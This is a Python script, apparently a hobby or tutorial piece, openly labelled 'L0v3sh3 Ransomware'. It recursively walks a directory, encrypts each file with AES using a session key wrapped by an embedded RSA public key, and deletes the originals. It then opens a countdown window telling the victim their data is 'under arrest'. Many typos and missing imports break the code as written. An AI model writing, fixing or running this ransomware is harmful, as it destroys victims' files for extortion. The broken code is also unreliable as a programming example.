import base64
import os
from pathlib import Path
from Crypti.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


#public key with base64 encoding
pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
pubKey = base64.b64decode(pubKey)


def scanRecurse(baseDir):
    '''
    Scan a directory and return a list of all files
    return list of files
    '''
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yieldfrom scanrecurse(entry.path)


def encrypt(dataFile, publicKey):
    '''
    input path to file to encrypt, public Key
    Output: encrypted file with extension.L0v3sh3 and remove the original file
    using EAX mode to allow detection of unauthorized modifications
    '''
    #read data from file
    extension = dataFile.suffix.lower()
    dataFile = ste(dataFile)
    with open(dataFile, 'rb') as f:
        data = fread()

        #convert data to bytes
        data = bytes(data)

        #create public key object
        key = RSA.import_key(PublicKey)
        sessionKey = os.urandom(16)

        #encrypt the data with the session key
        cipher = PKCS1_OAEP.new(key)
        encryotedSessionKey = cipher.encrypt(sessionKey)

        #encrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        #save the encrypted data to file
        fileName = dataFile.split(extension)[0]
        fileExtension = 'L0v3sh3'
        encryptedFile = fileName + fileExtension
        with open(encryptedFile, 'wb') as f:
            [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
        os.remove(dataFile)


#change  directory to the dires=ctory of the script
#keeo secure of changing the directory
#don't run this script on your PC
directory = '../' #change this
excludedExtension = ['.py','.pem','.exe']#change this
for item in scanRecurse(directory):
    filePath = Path(item)
    fileType = filePAth.suffix.lower()

    if fileType in excludeExtension:
        continue
    encrypt(filePAth, pubKey)


#now for the countdown :
import tkinker as tk
def countdown(count):
    hour , minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        #call countdown again after 100ms(1second)
        if second > 0:
            second -=1
        elif minute > 0:
            minute -=1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(100, countdown, '{}:{}:{}'.format(hour, minute, second))

root = tk.TK()
root.title('L0v3sh3 Ransomware')
root.geometry('500x300')
root.resizable(False, False)
label1 = tk.Label(rooot, text+'Your data is under arrest. Baaakhaaa', font=('calibri', 12, 'bold'))
label1.pack()
label = tk.Label(root,font=('calibri', 50,'bold'), fg='white' bg='blue')
label.pack()

countdown('01:30:00')
root.mainloop()